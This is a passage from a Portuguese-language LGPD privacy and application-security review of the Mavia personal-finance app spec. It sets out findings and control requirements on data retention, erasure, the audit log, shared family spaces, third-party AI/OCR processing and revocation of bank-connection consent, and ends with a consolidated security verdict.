| `auditoria.*` (`usuario_id`, `entidade`, `de/para JSONB`, `ip_hash`) | Registrar quem alterou o quê no espaço, para transparência e apuração | Legítimo interesse (art. 7º IX) + accountability (arts. 37 e 46) — exige **LIA escrita**, que não existe | **`FALTA`** — o spec diz "permanente"; **"para sempre" não é prazo** | **`FALTA`** — e colide com o append-only (B-09) |
| `ip_hash` / `user_agent_hash` | Investigar acesso indevido e provar consentimento | Legítimo interesse | Igual ao registro que os contém | Com o registro |
| `exportacoes` (`escopo`, `storage_key`) | Entregar a portabilidade e a exportação pedida | Execução de contrato + direito do titular (art. 18 V) | `expira_em` ≤ 7 dias | **`FALTA`** — apagar o **objeto**, não só a linha (A-28) |

### B-01 · `Crítico` · Não existe política de retenção — e há um job que a aplica

**O que está errado.** §5.2 define `retencao.aplicar`, cron diário 04:00, "declarativo: converge para o estado alvo". **O estado alvo não está definido em nenhum documento do projeto.** Um job de retenção sem tabela de retenção é um `no-op` com nome tranquilizador — e é pior que não ter, porque cria a impressão de que o assunto está resolvido. Das ~30 classes de dado pessoal acima, **duas** têm prazo declarado (`atividades`: 90 dias visíveis; `exportacoes.expira_em`), e nenhuma tem prazo *interno* declarado.

Este é o meu segundo item de veto: "dado sem prazo de retenção e sem mecanismo de descarte".

**Requisito de controle.**
> Criar `docs/lgpd/retencao.md` como documento **normativo** com uma linha por tabela: dado · finalidade (uma frase) · base legal · gatilho de contagem · prazo · ação no vencimento (`apagar` | `pseudonimizar` | `agregar`). `retencao.aplicar` lê essa tabela como configuração versionada em código (`packages/domain/retencao/politica.ts`), e um teste de S1 falha se existir tabela no schema Drizzle sem entrada na política — assim, **criar tabela nova sem declarar retenção quebra o build**. Métricas por classe: quantos registros venceram, quantos foram tratados, quantos falharam.

---

## B.2 Exportação e eliminação — toda entidade nova aparece nos dois fluxos?

**Resposta: não. A maioria não aparece em nenhum dos dois.** O item de veto do meu papel — *"entidade nova ausente dos fluxos de exportação e eliminação"* — está acionado.

O que o spec tem: a tabela `exportacoes (formato, escopo JSONB, storage_key, estado, expira_em)`, o módulo `arquivos.gerarExportacao(formato, escopo)`, as rotas `POST /exportacoes` · `GET /exportacoes/:id`, e uma linha de tela: *"Dados e privacidade: exportar tudo (LGPD, portabilidade) · excluir o espaço por completo com prazo e consequências · política de retenção. Existe por obrigação legal, não por escolha de produto."* Um `escopo JSONB` sem enumeração é uma promessa não verificável.

### B-02 · `Crítico` · A exportação não enumera as entidades — e as que dá para inferir são minoria

| Entidade | Exportação | Eliminação | Situação |
|---|---|---|---|
| `lancamentos` | Provável (CSV/OFX de §2.2) | Soft delete apenas | Parcial |
| `contas`, `cartoes`, `categorias`, `etiquetas` | Provável | Só `arquivada_em` / soft delete | Parcial |
| **`transferencias`** (o grupo) | **Ausente** | Ausente | ⛔ |
| **`parcelamentos`** (com `purchase_date`) | **Ausente** — e é o fato que o épico 3 existe para preservar | Ausente | ⛔ |
| **`faturas`** | **Ausente** | Ausente | ⛔ |
| **`recorrencias`** | **Ausente** | Ausente | ⛔ |
| **`planejamentos`** | **Ausente** | Ausente | ⛔ |
| **`objetivos`** | **Ausente** | Ausente | ⛔ |
| **`aportes`** (vínculo `Lancamento` ↔ `Objetivo`) | **Ausente** | Ausente | ⛔ |
| **`conexoes`** (metadados: instituição, escopo, datas — **não** a credencial) | **Ausente** | Ausente | ⛔ |
| **`consentimentos`** | **Ausente** — e é o documento que mais interessa ao titular | Retenção própria (prova) | ⛔ |
| **`sincronizacoes`** | **Ausente** | Ausente | ⛔ |
| **`lancamentos_brutos`** | **Ausente** | Ausente | ⛔ |
| **`conciliacao_sugestoes`** | **Ausente** | Ausente | ⛔ |
| **`regras_categorizacao`** | **Ausente** | Ausente | ⛔ |
| **`auditoria` / atividades** | §2.13 tem botão "exportar" que **não passa** por `exportacoes` | Append-only, sem saída | ⛔ (B-09) |
| **`anexos`** (os arquivos, não a linha) | **Ausente** | Ausente | ⛔ |
| **`notificacoes`** | **Ausente** | Ausente | ⛔ |
| **`preferencias`** | **Ausente** | Ausente | ⛔ |
| **`tenant_usuarios`** | **Ausente** | Ausente | ⛔ |
| `saldo_snapshots` | Dispensável (derivado) | Dispensável | Declarar como derivado |

**Requisito de controle.**
> (1) `escopo JSONB` deixa de ser livre: `zEscopoExportacao` em `contracts` enumera **todas** as entidades acima, e a exportação "tudo" as inclui por padrão. (2) Formato de portabilidade (art. 18 V — "formato que permita a transferência a outro fornecedor", legível por máquina): um ZIP com `manifesto.json` (versão do schema, data, tenant, base temporal declarada, aviso de que valores são inteiros de centavos) + um `.jsonl` por entidade + os binários dos anexos em `anexos/`. O CSV/OFX de lançamentos continua existindo como conveniência de produto — não é a portabilidade. (3) **Teste que impede regressão** (S2): um teste percorre o schema Drizzle e falha se uma tabela de negócio não estiver em `zEscopoExportacao` nem numa lista explícita de exclusões justificadas. É o mesmo mecanismo de B-01, e é o que faz esta conformidade sobreviver ao épico 12. (4) Prazo de atendimento: gerado automaticamente em ≤ 72 h, e nunca mais de 15 dias.

### B-03 · `Crítico` · Não existe mecanismo de eliminação — nem rota, nem job, nem definição do que "eliminar" significa aqui

**O que está errado.** O sistema declara `DELETE /tenants/:id/membros/:usuarioId` e nada mais: **não existe `DELETE /tenants/:id`, não existe rota de exclusão de conta de usuário, não existe job de eliminação em §5.2, e não existe nenhuma frase descrevendo o que acontece fisicamente.** A única menção é "excluir o espaço por completo com prazo e consequências", em §2.12 da IA. O teardown mostra que até o concorrente tem "Excluir conta por completo" e "Começar do zero" — e "Começar do zero" está no nosso spec de Preferências **sem** nenhuma definição de o que apaga, se apaga de verdade, e o que acontece com a auditoria dos lançamentos apagados.

E há a colisão frontal, que precisa ser resolvida por decisão explícita e não por omissão: **regra 17 do `CLAUDE.md` ("soft delete em tudo que é financeiro, `deleted_at`, nunca `DELETE`") e regra 18 (auditoria append-only com `REVOKE UPDATE, DELETE`) contra o art. 18 VI da LGPD (eliminação).** Soft delete não é eliminação. O meu papel diz textualmente: *"descreva o que acontece de fato no pedido de exclusão"* — e o spec não descreve.

**Requisito de controle.**
> Escrever `docs/lgpd/eliminacao.md` + ADR, distinguindo **três operações que hoje estão confundidas em uma palavra**:
>
> | Operação | O que é | Mecanismo |
> |---|---|---|
> | **Excluir um registro** (lançamento, conta) | Operação de produto dentro de um espaço vivo. **Não** é eliminação LGPD | `deleted_at` (regra 17 preservada, sem conflito) |
> | **Eliminar o titular** (usuário sai da plataforma) | Direito do art. 18 VI sobre os dados **dele** | Apagar fisicamente `usuarios`, `sessoes`, `preferencias`, `notificacoes` do titular; **pseudonimizar** `criado_por` e `auditoria.usuario_id` para um identificador estável e irreversível (`membro_removido:<hash>`); os `lancamentos` do espaço **permanecem**, porque são do espaço e sua eliminação quebraria o saldo de outros titulares (art. 16 II/III — guarda necessária à execução do contrato) |
> | **Eliminar o espaço** (`Tenant`) | Fim do contrato | `DELETE` **físico** de todas as tabelas do tenant, purga dos objetos de storage (anexos + exportações), crypto-shredding das DEKs, e expurgo do índice de busca/cache. Sobrevive apenas: `consentimentos` (prova, 5 anos, com dados minimizados) e registros exigidos por obrigação legal, enumerados um a um |
>
> Além disso: (1) rota `DELETE /tenants/:id` e `DELETE /auth/eu`, ambas com reautenticação e confirmação por digitação; (2) janela de arrependimento de **7 dias** comunicada ao titular, e execução por job (`eliminacao.aplicar`), nunca por ticket humano; (3) prazo total ≤ 30 dias, com confirmação por e-mail quando concluir; (4) **backups**: declarar que o dado eliminado sobrevive nos backups por no máximo `N` dias (o mesmo `N` da retenção de backup), que uma restauração re-executa a fila de eliminações pendentes antes de servir tráfego, e que isso está escrito na política de privacidade — sem essa declaração, "eliminamos" é afirmação falsa; (5) **"Começar do zero"** (§2.12) é especificado no mesmo documento: apaga fisicamente `lancamentos`, `lancamentos_brutos`, `faturas`, `parcelamentos`, `transferencias`, `aportes`, `anexos` e `saldo_snapshots`; preserva contas, cartões, categorias, etiquetas; grava **uma** entrada em `auditoria` com a contagem do que foi apagado; e avisa no diálogo que o histórico de atividades daqueles lançamentos permanece.

---

## B.3 O log de atividades

Fatos do spec: `auditoria (id BIGSERIAL, usuario_id, entidade, entidade_id, acao, de JSONB, para JSONB, ocorrido_em, request_id, ip_hash)`, append-only por `REVOKE UPDATE, DELETE ON auditoria FROM mavia_app`, alimentando a tela Atividades — "90 dias visíveis, retenção maior por compliance" (§3.6) e "internamente o log é append-only e **permanente**" (§2.13).

### B-04 · `Alto` · "Permanente" não é prazo, e não há base legal escrita

**O que está errado.** Duas afirmações do próprio spec ("retenção maior por compliance" e "permanente") não concordam entre si, e nenhuma das duas é um prazo. A base legal do log é legítimo interesse (art. 7º IX) somado ao dever de accountability (art. 37) e de segurança (art. 46) — mas legítimo interesse exige **teste de balanceamento documentado (LIA)**, com finalidade legítima, necessidade e salvaguardas ao titular. Não existe.

**Requisito de controle.**
> LIA escrita em `docs/lgpd/lia-auditoria.md`: finalidade (integridade financeira, transparência entre membros do espaço, apuração de incidente), necessidade (sem log não há como responder "quem mexeu" nem notificar a ANPD com precisão), salvaguardas (minimização do `de/para`, `ip_hash` com HMAC, prazos, acesso restrito, exposição ao próprio titular). Prazos que substituem "permanente": **90 dias** visíveis na tela; **5 anos** de retenção interna para eventos de escrita financeira e de segurança (prescrição civil/consumerista e obrigação de prestação de contas); **12 meses** para eventos de leitura/acesso; depois, expurgo por job com a tabela particionada por mês (`DROP PARTITION` é o único descarte viável em volume).

### B-05 · `Alto` · O log duplica o conteúdo financeiro — então "excluir" na UI não elimina

**O que está errado.** `auditoria.de/para JSONB` guarda o antes e o depois de cada escrita financeira, ou seja, **a descrição e o valor do lançamento estão dentro do log**. Consequência direta: excluir um lançamento pela UI não remove seu conteúdo do sistema, porque a auditoria o preserva — e o titular não é informado disso. Isso é um problema de transparência (art. 9º) antes de ser um problema técnico.

Pior: a tabela é append-only por `REVOKE UPDATE, DELETE`, o que significa que **não existe hoje nenhum caminho técnico para pseudonimizar ou expurgar o log**. A regra 18 e o art. 18 VI se bloqueiam mutuamente, e o spec não percebeu a colisão.

**Requisito de controle.**
> (1) **Minimização no `de/para`:** registrar os campos estruturais (entidade, ação, categoria, conta, status, timestamps) e, para campos livres e valores, registrar **hash + comprimento** em vez do conteúdo, salvo quando o valor for o objeto da mudança e sua exibição for necessária na tela Atividades — decidir campo a campo e escrever a lista. O objetivo declarado: um vazamento da tabela `auditoria` não pode reconstituir o extrato do cliente. (2) **Caminho de expurgo/pseudonimização auditado:** criar o papel `mavia_retencao`, sem acesso a nenhuma outra tabela, com permissão de `UPDATE` restrita às colunas `usuario_id`, `de`, `para` de `auditoria` e de `DROP` de partição vencida; toda execução registra num log separado (`retencao_execucoes`) que **este** sim é imutável. `mavia_app` continua sem `UPDATE`/`DELETE` — a regra 18 permanece intacta para o caminho de aplicação. (3) A tela Atividades e o diálogo de exclusão dizem, em uma frase, que o registro da ação permanece por 90 dias mesmo depois de o lançamento ser excluído.

### B-06 · `Alto` · Campos livres coletam dado sensível por inferência, e o regime muda quando isso acontece

**O que está errado.** `lancamentos.descricao`, `lancamentos.observacao`, `objetivos.nome` e `etiquetas.nome` são texto livre. Na prática, um extrato pessoal contém: `"Consulta Dra. Fulana — oncologia"`, `"Dízimo Igreja X"`, `"Contribuição partido Y"`, `"Advogado do divórcio"`, `"Farmácia — insulina"`, `"Juntar para a cirurgia da minha mãe"`. Isso é **dado sensível** na acepção do art. 5º II (saúde, convicção religiosa, filiação política) chegando por inferência a partir de dado comum.

O spec já demonstra consciência do problema em um caso — §2.3 recusa geolocalização com "dado sensível sem retorno claro — objeção de LGPD provável" — e não conecta o raciocínio ao campo de texto livre que está ao lado.

Consequência prática: o regime de tratamento desses campos é mais rígido em três pontos concretos, todos já mapeados neste gate — **envio a terceiro** (B-18), **saída em log** (A-38) e **exibição a outros membros do espaço** (B-14).

**Requisito de controle.**
> Registrar em `docs/lgpd/` a constatação de que campos livres são coletores incidentais de dado sensível, com três consequências operacionais **normativas**: (1) campo livre nunca é enviado a terceiro sem base própria e aviso no ponto de uso (B-18); (2) campo livre nunca aparece em log, métrica, mensagem de erro, push ou e-mail (A-38, A-43); (3) a política de privacidade explica, em português claro, que o titular controla o que escreve ali e recomenda não registrar informação de saúde ou convicção que ele não queira armazenada. **Não** criar campo estruturado de saúde, religião ou política em nenhuma hipótese — a inferência incidental é tolerável; a coleta deliberada não.

### B-07 · `Alto` · `lancamentos_brutos.payload` — dado cru, de terceiros, sem prazo

**O que está errado.** "Preservado para auditoria e reprocessamento" (`CONTEXT.md` e §3.5) não é prazo — é a definição de "para sempre". E o conteúdo é o pior possível do ponto de vista de minimização: o payload cru de um OFX/CSV bancário contém agência, número de conta, identificadores da instituição e, com frequência, a **chave Pix da contraparte**, que é CPF, telefone ou e-mail — dado pessoal de **terceiros que nunca contrataram a Mavia e não têm como exercer direito nenhum aqui**. Acumular isso indefinidamente é o oposto do princípio da necessidade (art. 6º III).

**Requisito de controle.**
> (1) **Minimização na entrada:** `normalizar()` (em `domain/ingestao`) extrai os campos necessários e **redige** do `payload` persistido os identificadores de conta/agência/documento/chave Pix da contraparte, preservando apenas o que a idempotência exige — o `conteudo_hash` continua sendo calculado sobre o conteúdo normalizado completo, então a regra 13 não é afetada. (2) **Prazo:** brutos **não promovidos** são apagados em 7 dias; brutos **promovidos** em 90 dias após a promoção (o `Lancamento` é a fonte de verdade a partir daí, e o "desfazer importação" de §2.10 tem janela de 7 dias, logo 90 é folgado); brutos de conexão revogada, imediatamente (B-21). (3) `payload` nunca sai por API (A-25).

---

## B.4 Compartilhamento familiar — vários `Usuario` por `Tenant`

Este é o ponto onde o modelo do projeto tem uma tensão estrutural que o spec ainda não enxergou:

> **O `Tenant` é a unidade de isolamento, mas não é a unidade de titularidade.** Cada membro é titular dos seus próprios dados pessoais, dentro de um espaço que é compartilhado. Todo direito do art. 18 é individual; todo dado do espaço é coletivo. O produto precisa de uma regra escrita para cada lugar onde os dois colidem, e hoje não tem nenhuma.

### B-08 · `Alto` · Quando A vê o lançamento de B: base legal e informação prévia

**O que está errado.** `tenant_usuarios` tem `convidado_por` e `aceito_em` — e nada mais. Não há texto de aceite, não há versão de termo, não há tela descrita para o convite, e §2.15 (Onboarding) despacha o caso em uma linha: *"convidado entrando em espaço existente (pula tudo, vai para o dashboard)"*. Ou seja: B entra num espaço e passa a expor **todo o seu histórico financeiro futuro** a A, e a **ver todo o histórico passado de A**, sem que nada tenha sido informado ou registrado.

**Base legal correta.** A visibilidade mútua se apoia em **execução de contrato** (o espaço compartilhado é o serviço contratado) somada ao **consentimento informado de B no aceite** — e o consentimento só é válido se for informado (art. 9º). Sem o texto, não há consentimento; há apenas um clique.

**Requisito de controle.**
> `tenant_usuarios` ganha `termo_versao TEXT NOT NULL` e `aceito_em`. A tela de aceite mostra, antes do botão, em português claro e sem juridiquês:
>
> > **Ao entrar no espaço "Casa da Ana", você vai:**
> > - ver **todos** os lançamentos, contas, cartões e valores do espaço, inclusive os anteriores à sua entrada;
> > - deixar que os outros membros vejam **tudo** o que você lançar aqui, com o seu nome;
> > - aparecer em Atividades, onde ficam registradas suas ações por 90 dias.
> >
> > O proprietário do espaço pode remover você e pode excluir o espaço inteiro, com os lançamentos que você criou.
> > Você pode sair quando quiser e levar uma cópia dos seus dados.
>
> Nenhum membro é adicionado sem esse aceite explícito — inclusive o convidado que já tem conta.

### B-09 · `Alto` · O que acontece quando A sai do Tenant

**O que está errado.** `DELETE /tenants/:id/membros/:usuarioId` existe na superfície de API sem **nenhum** efeito declarado sobre dados. As quatro perguntas que aparecem no primeiro mês de uso familiar não têm resposta no spec:

1. **Os lançamentos que A criou somem?** Não podem sumir — o saldo do espaço quebraria e outros titulares perderiam seu histórico. Resposta correta: permanecem; a base é execução do contrato do espaço (art. 16 II).
2. **A leva uma cópia?** Precisa levar. Hoje, ao sair, A perde o acesso e não tem nenhum caminho para exercer portabilidade sobre o que inseriu.
3. **O nome de A continua aparecendo em Atividades e em `criado_por`?** Hoje, sim, para sempre. Depois que o vínculo acaba, isso deixa de ter base.
4. **A continua vendo alguma coisa?** Precisa parar imediatamente — inclusive sessões e tokens MCP já emitidos para aquele tenant.

**Requisito de controle.**
> Ao remover um membro (por ele ou pelo proprietário), na mesma transação: (1) revogar sessões e tokens OAuth/chaves de API **daquele tenant** para aquele usuário, com efeito ≤ 60 s (A-15, A-40); (2) oferecer e gerar automaticamente uma exportação do que A criou, disponível a A por 30 dias, com aviso por e-mail; (3) substituir a exibição de A por "Membro removido" na tela Atividades e em `criado_por` **após 90 dias** (mantendo `usuario_id` até lá para a apuração de incidentes, e pseudonimizando em definitivo depois), ou imediatamente se A pedir eliminação; (4) preservar os lançamentos, com a razão escrita no termo de B-08 e repetida no diálogo de saída; (5) impedir a remoção que deixaria o espaço sem proprietário (A-19). Tudo isso vira uma seção do `docs/lgpd/eliminacao.md` de B-03.

### B-10 · `Médio` · Convite trata dado de terceiro que ainda não é usuário

**Requisito de controle.**
> O e-mail de um convidado não cadastrado é tratado com base em legítimo interesse do convidante, exclusivamente para entregar o convite; convite não aceito expira em 7 dias (A-19) e o e-mail é apagado em 30 dias; o e-mail do convidado **nunca** é usado para marketing nem para sugerir conexões; a mensagem de convite diz quem convidou e para qual espaço, com link de recusa que apaga o registro na hora.

---

## B.5 Categorização por IA e OCR — o dado vai para terceiro?

**O spec não responde.** Este é exatamente o caso que o meu papel manda apontar como lacuna.

O que existe: `CONTEXT.md` — *"Categorizacao automatica — atribuição de Categoria por regra do Usuario, histórico do Tenant **ou modelo**"*; `sistema.md` §1.4 — módulo `inteligencia` com `sugerirCategoria(lancamento)` e `lerRecibo(anexoId)`; §1.1 — *"o modelo estatístico fica em `apps/api`"*; §2.3 — *"o modelo estatístico não é testado por asserção de acerto; é medido por **métrica offline**"*; §5.2 — job `anexo.ocr`; §6.3 — endpoint `GET /inteligencia/sugerir-categoria`, sem grupo em §4.1.

Duas leituras do mesmo spec são possíveis, com consequências jurídicas opostas: modelo **local** na VPS (sem transferência a terceiro) ou chamada a **API externa** (transferência de dado pessoal, possivelmente sensível, possivelmente internacional). O spec não escolhe, e a expressão "métrica offline" sugere ainda uma terceira coisa — **treinamento com dados de clientes** —, que é uma finalidade nova e não coberta por nenhuma base declarada.

### B-11 · `Crítico` · Terceiro não declarado em categorização por IA e OCR

**Requisito de controle.**
> ADR obrigatória antes do épico 7, decidindo entre as três opções e registrando a escolha:
>
> - **Se local** (modelo próprio na VPS): declarar isso explicitamente no spec e na política de privacidade — é diferencial competitivo real e barato de afirmar quando é verdade. Nenhuma dependência que faça chamada de rede entra em `inteligencia`, e um teste de rede no CI prova isso.
> - **Se terceiro:** (a) contrato de **operador** (art. 39) com vedação expressa de uso dos dados para treinamento do fornecedor, região de processamento declarada e retenção zero no terceiro; (b) se o processamento ocorrer fora do Brasil, hipótese do art. 33 registrada (cláusulas-padrão contratuais) — o que provavelmente será o caso com qualquer provedor grande de LLM ou OCR; (c) **subprocessadores listados publicamente** em `docs/lgpd/subprocessadores.md` e na política, com aviso de mudança; (d) aviso **no ponto de uso**, não enterrado nos termos: o selo `sugerida` de §2.3 ganha, ao toque, a frase *"a descrição deste lançamento foi enviada para <Fornecedor> para sugerir a categoria"*; (e) **opt-out por tenant** que não quebra o produto — desligado, a categorização cai para regras do usuário e histórico local, que já existem no domínio; (f) minimização: envia-se a descrição, nunca o valor, nunca o `payload` bruto, nunca o anexo inteiro quando um recorte serve; (g) cada envio gera registro de acesso (B-13), para que seja possível dizer, num incidente do fornecedor, exatamente o que saiu.
> - **Se houver treinamento com dado de cliente:** é finalidade **nova**, não coberta pela execução do contrato de categorização. Exige base própria — legítimo interesse com LIA e opt-out visível, ou consentimento — e, na prática, só é defensável sobre dado agregado ou anonimizado (art. 12). Escrever ou proibir; não deixar implícito.

### B-12 · `Alto` · OCR de recibo é o caminho mais provável de dado sensível sair da plataforma

**O que está errado.** `lerRecibo(anexoId)` processa a foto de um comprovante. Uma nota de farmácia lista medicamentos — **dado de saúde, art. 11**, cujo tratamento tem regime próprio e cujo compartilhamento com terceiro exige consentimento específico e destacado ou hipótese legal expressa. Nada no spec trata disso, e §2.3 lista OCR como "não tem no MVP (épico 7)", o que é a hora certa de decidir.

**Requisito de controle.**
> Se o OCR for de terceiro, o consentimento para anexos é **separado** do consentimento para categorização e é obtido no primeiro upload de anexo, com texto que menciona explicitamente que recibos podem conter informação de saúde. Se for local (`tesseract` ou equivalente rodando na VPS), o requisito desaparece e a sandbox de A-34 continua obrigatória. Em ambos os casos: o resultado do OCR **sugere e nunca preenche sozinho um valor monetário sem confirmação** — regra que §5.2 já traz e que deve permanecer.

### B-13 · `Alto` · Sem log de **leitura**, a notificação de incidente à ANPD é impossível de fazer direito

**O que está errado.** A regra 18 exige audit log "em toda escrita financeira". Um vazamento, porém, é uma **leitura**. Hoje, se um token MCP for comprometido, se uma sessão for roubada, ou se o fornecedor de IA sofrer um incidente, a Mavia não consegue responder as duas perguntas do art. 48 — *quem foi afetado* e *quais dados* —, porque nenhuma leitura é registrada. Sem isso, a notificação à ANPD e aos titulares é feita por estimativa, o que é simultaneamente ineficaz e indefensável.

**Requisito de controle.**
> Registrar em `auditoria` (ou em partição própria, com a retenção de 12 meses de B-04) todo **acesso em massa ou por terceiro**: `POST /exportacoes` e download do arquivo; download de anexo; qualquer requisição autenticada por token MCP ou chave de API (rota + contagem de registros retornados); toda execução de sincronização; todo envio a fornecedor de IA/OCR (o que foi enviado, para quem, quando). Leitura interativa comum de tela **não** é registrada — registrar tudo é caro, inútil e cria um segundo banco de dados de comportamento a proteger. O critério é: registra-se o que, num incidente, precisaria ser reconstituído. Métrica e alerta para leitura fora do padrão por cliente/token.

---

## B.6 Revogação de consentimento de conexão bancária — efeito técnico imediato

O que o spec tem, e está certo: `consentimentos` append-only com `versao_texto`, `escopo`, `concedido_em`, `expira_em`, `revogado_em`; `DELETE /conexoes/:id` "(revoga consentimento)"; job `retencao.aplicar` disparado por outbox `consentimento.revogado`; §2.11 promete ao usuário *"A sincronização para. Os lançamentos já importados permanecem no seu espaço."*; e §2.11 recusa explicitamente "reconexão silenciosa após expiração de consentimento". Esse conjunto é um bom começo. O que falta é o efeito.

### B-14 · `Crítico` · Revogar não destrói a credencial

**O que está errado.** O estado alvo descrito em §5.2 é "sync interrompida, brutos além do prazo purgados, conexão marcada `revogada`". **`credenciais_cifradas` e `dek_cifrada` não são mencionadas.** Uma conexão revogada que mantém a credencial armazenada continua sendo um ativo roubável, e a revogação vira um rótulo — precisamente o que o meu item de veto proíbe ("consentimento cuja revogação não tem efeito técnico").

**Requisito de controle.**
> Na mesma transação de `DELETE /conexoes/:id`: `UPDATE conexoes SET status='revogada', credenciais_cifradas=NULL, dek_cifrada=NULL, escopo=NULL`. O descarte da DEK é o mecanismo de descarte (crypto-shredding, A-37): a credencial torna-se irrecuperável mesmo a partir de backups que contenham o ciphertext, desde que não contenham a DEK. `consentimentos` **não** é apagado — ele é a prova, e ganha `revogado_em`.

### B-15 · `Crítico` · Revogação é assíncrona onde precisa ser síncrona

**O que está errado.** O corte depende do outbox (poller de 1 s — bom) e o `retencao.aplicar` também roda em cron 04:00. Nada no spec garante que: (a) um `sync.executar` **em voo** aborte; (b) os jobs `sync:${conexao_id}:${janela}` já enfileirados ou agendados (§5.2 fala em "cron por conexão, até 6×/dia") sejam **removidos** da fila; (c) o **provider** seja avisado para invalidar o token do lado dele — sem isso, a Mavia deixa de usar o acesso, mas o acesso continua existindo no agregador, o que é a definição de revogação incompleta perante o Open Finance.

**Requisito de controle.**
> `DELETE /conexoes/:id` executa, **antes de responder 200**: (1) grava `revogado_em` e zera credenciais (B-14); (2) remove da fila os jobs `repeatable` e `delayed` daquela conexão; (3) chama `BankSyncProvider.revogar(conexao)` — método **novo na interface do ADR 0003**, obrigatório para todo adapter, com no-op documentado para `manual`/`ofx-import`/`csv-import` e chamada real para `pluggy`; (4) publica `consentimento.revogado` no outbox para a limpeza assíncrona do resto. Uma sincronização já em execução verifica o estado da conexão a cada lote e aborta. Teste (S2): iniciar sincronização, revogar no meio, provar que nenhum `LancamentoBruto` novo é gravado após a revogação.

### B-16 · `Alto` · O titular não tem escolha sobre os dados já sincronizados

**O que está errado.** A tela decide por ele: *"Os lançamentos já importados permanecem no seu espaço."* Isso é **defensável** — ao revogar, o titular está retirando a autorização de *acesso continuado à instituição*, não necessariamente pedindo a eliminação do seu histórico, e a base do tratamento dos `Lancamento` já promovidos deixa de ser o consentimento e passa a ser a execução do contrato de controle financeiro. Mas só é legítimo com duas condições que hoje não existem: **estar escrito no texto de consentimento antes da concessão**, e **haver a alternativa**.

O meu papel determina que essa decisão seja conjunta com o `especialista-open-finance` e vire **ADR**. Ela não existe.

**Requisito de controle.**
> ADR conjunta (`especialista-lgpd-compliance` + `especialista-open-finance`) sobre o destino dos dados sincronizados após revogação. Conteúdo mínimo: o diálogo de revogação oferece **duas** escolhas explícitas —
> - **Manter meu histórico** (padrão): a sincronização para; os lançamentos permanecem; a base passa a ser a execução do contrato; e a origem `conectado` das contas vira `manual`.
> - **Revogar e apagar o que veio deste banco**: apaga fisicamente os `LancamentoBruto` e os `Lancamento` originados daquela conexão que não foram editados manualmente, com aviso de que **saldos e relatórios vão mudar** e com a contagem exata antes de confirmar. Lançamentos editados pelo titular ou conciliados com registro manual **permanecem** (a regra 15 protege o registro do usuário), e o diálogo diz isso.
>
> A escolha é registrada em `consentimentos` (ou em `auditoria`) como prova da decisão do titular.

### B-17 · `Alto` · Consentimento versionado sem os textos, sem reconsentimento e sem prazo máximo

**O que está errado.** `consentimentos.versao_texto` existe — bom —, mas: os textos versionados não moram em lugar nenhum; não há regra dizendo o que acontece quando o texto muda; `expira_em` existe sem política de prazo (o Open Finance brasileiro trabalha com autorizações de até 12 meses); e não há job que expire consentimento vencido nem que avise o titular — embora §2.11 já preveja a faixa de "consentimento expirando" na tela com 7 dias de antecedência.

**Requisito de controle.**
> (1) Textos de consentimento versionados em `packages/contracts/consentimentos/textos/v<N>.md`, imutáveis depois de publicados; `versao_texto` referencia o arquivo. (2) Mudança material do texto exige **reconsentimento** — a conexão vai para `expirada` e a sincronização para até o titular aceitar a versão nova. (3) `expira_em` máximo de **12 meses**; job diário marca vencidos, e o aviso de 7 dias é enviado por notificação além da faixa na tela. (4) Reconexão exige ato do titular, nunca renovação silenciosa (a §2.11 já decidiu isso; o job precisa respeitar).

### B-18 · `Médio` · Texto de consentimento — proposta

O meu papel manda entregar o texto quando houver consentimento. Proposta para a **v1**, a ser exibida integralmente antes do botão de autorizar, sem juridiquês e sem link obrigatório:

> **Conectar o Banco X à Mavia**
>
> Ao autorizar, você permite que a Mavia leia, **somente para você**:
> - o saldo e o extrato das contas que você escolher;
> - as faturas e os lançamentos dos cartões que você escolher.
>
> **A Mavia não movimenta dinheiro.** Nunca fazemos pagamento, transferência ou qualquer operação na sua conta. Só leitura.
>
> **Por quanto tempo:** 12 meses. Depois disso, você precisa autorizar de novo — não renovamos sozinhos.
>
> **Onde ficam suas credenciais:** guardadas cifradas, com uma chave que não fica no nosso banco de dados. Ninguém da Mavia consegue vê-las, e elas nunca aparecem na tela nem em relatório.
>
> **Como cancelar:** em Configurações → Conexões → Revogar. A leitura para na hora e suas credenciais são apagadas na hora. Você escolhe, nesse momento, se quer **manter** os lançamentos que já vieram deste banco ou **apagar** todos eles.
>
> **Quem mais vê:** todas as pessoas do espaço "<nome do espaço>" veem os lançamentos importados, como veem qualquer lançamento do espaço.
>
> Registramos a data, a hora e a versão deste texto para comprovar sua autorização.

---
---

# C. Veredito consolidado

## C.1 `especialista-seguranca-appsec` — ⛔ **REPROVADO**

O modelo de isolamento (ADR 0004 + §3.9) é sólido e acima da média da categoria. O que reprova não é o que está decidido — é o tamanho do que não está: uma superfície de API de ~90 rotas sem matriz de autorização, três grupos de endpoints existindo sem contrato, a criptografia do ativo mais valioso do sistema declaradamente adiada para uma ADR não escrita, e o vetor de upload — o único que compromete todos os tenants de uma vez — sem uma única linha de controle.

**Bloqueios (nenhum código do épico correspondente antes de resolvidos):**

| # | Achado | Item de veto acionado |
|---|---|---|
| 1 | **A-12** — matriz de autorização papel × ação × recurso não existe; `politica-acesso.pode()` nasceria vazia | *Endpoint sem autorização explícita no servidor* |
| 2 | **A-19** — `/tenants/:id/*` recebe tenant pelo path: IDOR de tenant e escalada de papel | *Endpoint sem autorização explícita* |
| 3 | **A-37** — ADR 0018 não escrita: envelope encryption sem algoritmo, sem AAD, sem `kek_versao`, sem rotação, sem resposta para o backup. O próprio spec admite a lacuna | *Segredo sem envelope encryption* |
| 4 | **A-32 / A-33 / A-34** — upload sem limite de tamanho, sem timeout, sem defesa de XXE, sem limite de descompressão, com OCR/PDF no mesmo processo que desembrulha DEKs | *Upload sem limite de tamanho e timeout* |
| 5 | **A-01** — o poller do `outbox` contradiz o veto de `BYPASSRLS`; `outbox` sem `tenant_id` e sem RLS | *Tabela de negócio sem RLS* |
| 6 | **A-29 / A-30 / A-31 / A-40** — `POST /sync/mutacoes`, `GET /sync/mudancas`, `POST /anexos`, `/inteligencia/*`, MCP e chaves de API existem no produto e não existem em `contracts` | *Endpoint sem autorização explícita* |
| 7 | **A-28** — `POST /exportacoes` sem reautenticação, sem rate limit, sem alerta ao titular, sem TTL de link | *PII sem controle de acesso; abuso sem detecção* |
| 8 | **A-07** — `/metricas` público com métrica em centavos | *Valor monetário fora do sistema* |

